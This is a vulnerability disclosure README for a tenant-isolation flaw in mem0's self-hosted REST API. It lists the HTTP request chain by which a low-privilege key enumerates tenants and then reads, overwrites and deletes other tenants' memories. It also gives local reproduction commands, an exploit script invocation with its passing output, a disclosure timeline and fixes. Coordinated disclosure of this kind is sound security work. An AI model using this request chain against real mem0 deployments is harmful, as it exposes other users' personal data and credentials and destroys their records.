# mem0 — Broken Tenant Isolation in Self-Hosted REST API

Coordinated vulnerability disclosure for the mem0 open-source memory layer.

Any authenticated API key — including a low-privilege `role=user` key — can enumerate
every tenant namespace on a shared instance and read, overwrite, or delete other
tenants' memories. Only the unfiltered `GET /memories` listing is role-gated; supplying
`?user_id=<victim>` bypasses it.

| ID | Severity | CVSS 3.1 | CWE |
|----|----------|----------|-----|
| MEM0-2026-01 | High | 8.8 | CWE-639 |
| MEM0-2026-02 | Medium | 4.3 | CWE-200 |
| MEM0-2026-03 | Low | 4.3 | CWE-770 |

Detailed advisory: [`advisory/2026-11-18-mem0-tenant-isolation.md`](advisory/2026-11-18-mem0-tenant-isolation.md)

Plain-language explainer: [`advisory/plain-language-explanation.md`](advisory/plain-language-explanation.md)
Full assessment report with raw evidence: [`report.md`](report.md)

## Affected

- mem0 OSS `server/` REST API (`mem0ai 2.2.1`), commit `f1791da`
- Configuration: `AUTH_DISABLED=false`, more than one principal sharing the instance
- Fixed-in: **unreleased** — watch the upstream repository

## Proven chain (low-privilege key)

```http
GET /entities                                    -> 200  lists every user_id/agent_id/run_id
GET /memories?user_id=alice_tenant               -> 200  victim memory (PII, credentials)
GET /memories/1bd03115-...                       -> 200  full record
GET /memories/1bd03115-.../history               -> 200  mutation history
POST /search {"filters":{"user_id":"alice_tenant"},"threshold":0} -> 200
PUT /memories/{id} {"text":"overwritten"}        -> 200
DELETE /memories/{id}                            -> 200
GET /memories (no identifier)                    -> 403  <- gate exists, bypassed above
GET /configure                                   -> 200  internal DB host/port/user
```

## Reproduce locally

```bash
# 0. clone the mem0 source somewhere
git clone https://github.com/mem0ai/mem0.git ~/src/mem0

# 1. bring up pgvector + venv + stub OpenAI + server + two principals
MEM0_SRC=~/src/mem0 ./poc/setup_local.sh

# 2. run the cross-tenant proof with the low-privilege key it prints
BASE=http://127.0.0.1:8000 KEY=<keyB> VICTIM=alice_tenant ./poc/poc_cross_tenant.sh
```

`setup_local.sh` seeds a victim namespace (`alice_tenant`) and a second tenant
(`bob_tenant`), provisions an operator-created `role=user` account, and prints both keys.
Everything is local, synthetic, and disposable — `docker compose down -v` cleans up.

## Automated exploit (CVE-grade proof)

`poc/exploit.py` is the assertion-gated exploit: 14 checks over live HTTP, exit 0
only when the whole chain is confirmed. It plants the write/delete target with the
**victim's** key so ownership is established independently of the attacker, records
request IDs + UTC timestamps into a JSON transcript, and prints the transcript hash.

```bash
BASE=http://127.0.0.1:8000 \
ATTACKER_KEY=<role=user key> \
VICTIM_KEY=<key owned by another principal> \
VICTIM=alice_tenant \
./poc/exploit.py --json transcript.json
```

```
[PASS] 00 attacker identity: role='user'
[PASS] 01 enumerate tenants: victim 'alice_tenant' disclosed among [...]
[PASS] 02 victim creates owned record: memory_id=… created with VICTIM key
[PASS] 03 read foreign memory by id
[PASS] 03 read foreign history
[PASS] 03 read by namespace
[PASS] 03 semantic search into foreign namespace
[PASS] 04 control: unfiltered listing denied: status=403
[PASS] 05 overwrite foreign memory
[PASS] 05 owner observes injected content
[PASS] 06 delete foreign memory
[PASS] 06 owner record gone
result: CONFIRMED  steps=14  failures=0
transcript_sha256: 51543c0d…f8ba
```

The committed run is `evidence/04_exploit_transcript.{txt,json}`; hashes in
`evidence/MANIFEST.txt` (`04_exploit_transcript.json` = `23a34152…c666`).

## Submitting upstream

Per mem0's `SECURITY.md`, use **GitHub Private Vulnerability Reporting**
(`mem0ai/mem0` → Security → Advisories → New draft), with `support@mem0.ai`
(subject `SECURITY: Mem0 vulnerability report`) only as fallback. GitHub is the
CNA that issues this repo's CVEs, so do not mail MITRE first.

Include the required AI disclosure: an LLM assistant was used for code analysis
and drafting; the reporter ran `poc/exploit.py` against a live build and
confirmed all 14 assertions plus the recorded impact. Details and ready-to-paste
fields: [`advisory/upstream-disclosure.md`](advisory/upstream-disclosure.md).

This repository is **public** as of 2026-11-21:
<https://github.com/Teycir/mem0-tenant-isolation> — it contains the full report,
evidence transcripts, and the runnable PoC, and serves as the public reproduction
package for the two VulnCheck submissions.

## Disclosure timeline

| Date (UTC) | Event |
|---|---|
| 2026-11-18 | Findings reproduced against commit `f1791da`, report + PoC captured |
| 2026-11-18 | Disclosure package prepared locally (nothing published) |
| 2026-11-18 19:29Z | Email report sent to `support@mem0.ai` from ProtonMail; body-only (no attachments), archived at `evidence/06_email_sent_2026-11-18T192930Z.eml` |
| 2026-11-18 19:20Z | GitHub private advisory created → `GHSA-62c5-2wrq-ffpv`, severity high, credit `Teycir`; confirmed in state `triage` via REST |
| 2026-11-21 | Both findings submitted to VulnCheck — MEM0-2026-01 case `68502237-1e2c-4a2d-9d00-baac94a8a65a`, MEM0-2026-02 case `2f43d35e-08a2-4356-b759-0809b3adb080` |
| 2026-11-21 | Report repository made public (full report + evidence + PoC = reproduction package) |


## Remediation (short)

1. Bind `user_id`/`agent_id`/`run_id` to the authenticated principal server-side; reject mismatches.
2. Add ownership checks to `GET/PUT/DELETE /memories/{id}` and `/history`; scope `/search` the same way.
3. Restrict `GET /entities` and `GET /configure` to `require_admin`; redact config keys by substring.
4. Rate-limit memory routes and replace the 10k-row `/entities` scan with a `DISTINCT` query.

## License

MIT — see [`LICENSE`](LICENSE). PoC and report provided for defensive and remediation purposes.
